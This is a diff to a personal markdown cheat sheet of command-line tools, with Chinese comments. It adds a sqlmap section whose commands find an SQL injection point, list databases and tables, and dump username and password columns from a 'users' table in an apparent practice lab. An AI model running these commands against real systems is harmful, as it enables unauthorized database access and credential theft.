@@ -1,6 +1,6 @@
 
 
-### scoop
+## scoop
 <https://scoop-docs.now.sh/docs/>
 ```shell
 alias       Manage scoop aliases # 别名
@@ -30,10 +30,9 @@ which       Locate a shim/executable (similar to 'which' on Linux) # 查看可�
 ```
 
 
-### you-get
+## you-get
 <https://github.com/soimort/you-get>
 
-常用命令
 ```shell
 you-get url
 you-get -i url
@@ -42,5 +41,20 @@ you-get -o "output-dir" url
 you-get -u url
 ```
 
-### github
+## github
 <https://docs.github.com/cn>
+
+
+## sqlmap
+<http://sqlmap.org/>
+
+```shell
+sqlmap -u url    #检查注入点
+sqlmap -u url --dbs    #爆所有数据库信息
+sqlmap -u url --current-db    #爆当前数据库信息：
+sqlmap -u url -D pikachu --tables    #指定库名列出所有表
+sqlmap -u url -D pikachu -T users --columns    #指定库名表名列出所有字段
+sqlmap -u url -D pikachu -T users -C username,password --dump    #列出表里的值
+
+
+```
